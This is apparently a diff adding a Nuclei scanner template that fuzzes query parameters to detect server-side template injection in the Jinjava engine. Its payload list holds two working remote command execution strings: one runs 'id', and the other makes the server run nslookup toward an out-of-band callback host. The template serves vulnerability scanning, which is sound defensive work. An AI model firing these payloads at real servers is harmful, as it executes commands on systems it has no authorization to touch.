@@ -1,0 +1,47 @@
+id: jinjava-ssti
+
+info:
+  name: Jinjava - Server Side Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Jinjava is a Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#jinjava---command-execution
+  metadata:
+    max-request: 1
+  tags: ssti,dast,jinjava
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{{%27a%27.getClass().forName(%27javax.script.ScriptEngineManager%27).newInstance().getEngineByName(%27JavaScript%27).eval(%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command(%5C%5C%5C%22nslookup%5C%5C%5C%22,%20%5C%5C%5C%22-type=SRV%5C%5C%5C%22,%20%5C%5C%5C%22{{interactsh-url}}%5C%5C%5C%22)%3B%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())%5C%22)}}"
+        - "{{%27a%27.getClass().forName(%27javax.script.ScriptEngineManager%27).newInstance().getEngineByName(%27JavaScript%27).eval(%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command(%5C%5C%5C%22id%5C%5C%5C%22)%3B%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())%5C%22)}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+# digest: 490a00463044022009e471af7219a7639a467c4bc520db6ab774746b4dc0aefc0182930ce12940a3022077b368e377321ba8b805aa19bdf3debc133f0ff5a504c41968784872719209dc:922c64590222798bb761d5b6d8e72950
